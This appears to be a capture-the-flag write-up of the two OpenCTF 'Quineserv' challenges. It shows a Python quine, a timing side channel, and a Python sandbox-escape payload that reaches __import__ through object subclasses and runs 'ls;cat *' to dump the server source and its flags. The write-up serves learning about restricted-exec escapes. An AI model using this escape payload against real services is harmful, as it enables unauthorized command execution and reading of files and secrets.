# Quineserv (64 pts) & Return to Quineserv (99 pts)

These are two misc-category challenges in one service, solved 20 and 5 times respectively.

>Electric Frankenstein wrote this service. I think it is going a little too far into Gödel Escher Bach if you ask me. But at least it tells you when you accidentally infect the laboratory with a virus.
>challenges.openctf.cat:9006

When connecting to the service we are greeted with a prompt. Let's throw some inputs at it and see what's up:

```python
$ nc challenges.openctf.cat 9006
# 
nothing is apparently a quine, but we don't want this to be that easy.
# ls
Traceback (most recent call last):
  File "./quineserv.py", line 45, in <module>
    exec(inp, {'__builtins__': {'print':mixprint, 'repr':repr, 'flag':''}}, {})
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
# print('foo')
Quines win. You lose.
```

So it's a Python service. Apparently it `exec`'s our input with hardly any builtins. But our input must be a quine.
Google to the rescue. We'll need one that's compatible with the available builtins:

```python
$ nc challenges.openctf.cat 9006
# print((lambda s:s%s)('print((lambda s:s%%s)(%r))'))
You win level 1. flag{If only one of us could find the time. adeb4289b6a555}
print((lambda s:s%s)('print((lambda s:s%%s)(%r))'))
```

Yay! **Quineserv** done. But shortly after, **Return to Quineserv** pops up:
>It behooves me to ask you to return to quineserv. I'm pretty sure you didn't actually take from it what was once Electric Frankenstein's. I believe that they thought themselves better than you in placing two flags in the same challenge. One to make you think that you had won, and the other to mock your lack of skill. For the first will become worthless among the fierce competition of hackers, the second, not so much.

The service remains the same. We recall that it executed our input. But we aren't shown the output unless it's a quine. But maybe that's alright:

```bash
$ time (echo '[x for x in [0]*10000000]' | nc challenges.openctf.cat 9006)
real	0m0,712s
$ time (echo '[x for x in [0]*50000000]' | nc challenges.openctf.cat 9006)
real	0m2,609s
```

We're able to leak information. So we could set up something to leak the output of our commands spectacularly slowly. Or we can set up a local testing environment that runs Python3 in the same `exec` context and hope we get it right... Sounds like a lot of work.

But actually, it's gonna be super easy. Barely an inconvenience.

 I had a look in the toolbox. Can we find `__import__` and run a shell to print to stdout directly, before failing the quine check? Yes we can.

```python
$ nc challenges.openctf.cat 9006
# [t for t in ().__class__.__bases__[0].__subclasses__() if 'ModuleSpec' in t.__name__][0].__repr__.__globals__['__import__']('os').system('ls;cat *')
bin           lib           opt           run           tmp
dev           lib64         proc          sbin          usr
etc           media         quineserv.py  srv           var
home          mnt           root          sys
cat: read error: Is a directory
[...]
#!/usr/bin/env python3
"""
Quine server
by Javantea
May 4, 2019

Code execution as a service.
"""
from sys import modules, hexversion
modules.clear()
del modules

flag1 = 'flag{If only one of us could find the time. adeb4289b6a555}'
flag2 = "flag{A Sweet Sickeness, comes over me, I'm looking for something I want. lsUHNel2gLs}"

def sane_input(prompt='# '):
    """
    input(prompt) if Python didn't make python2 input(prompt).
    """
    if hexversion >= 0x3000000:
        return input(prompt)
    #end if
    return raw_input(prompt)
#end def sane_input(prompt)

inp = sane_input()
inp = inp[:1900]
#Dick move: you also have to only use the characters that my solution did.
inp = inp.encode('utf-8').translate(bytes(range(256)), b'')
if inp == b'':
    print("nothing is apparently a quine, but we don't want this to be that easy.")
    inp = b'===='
    exit(1)
#end if
v = ''
def mixprint(*args):
    """
    A print that doesn't do very interesting things. It's kinda similar to print.
    """
    global v
    r = ' '.join(['{{{0}}}'.format(i) for i in range(len(args))])
    v += r.format(*args)
#end def mixprint(*args)

exec(inp, {'__builtins__': {'print':mixprint, 'repr':repr, 'flag':''}}, {})

if v == inp.decode('utf-8'):
    print("You win level 1. {0}".format(flag1))
    v = ''
    exec(inp, {'__builtins__': {'print':mixprint, 'repr':repr, 'flag':flag2}}, {})
    print(v)
else:
    print("Quines win. You lose.")
    #print(repr(v))
    #print(repr(inp))
#end if

cat: read error: Is a directory
[...]
Quines win. You lose.
```

And there it is. Our sweet flag.
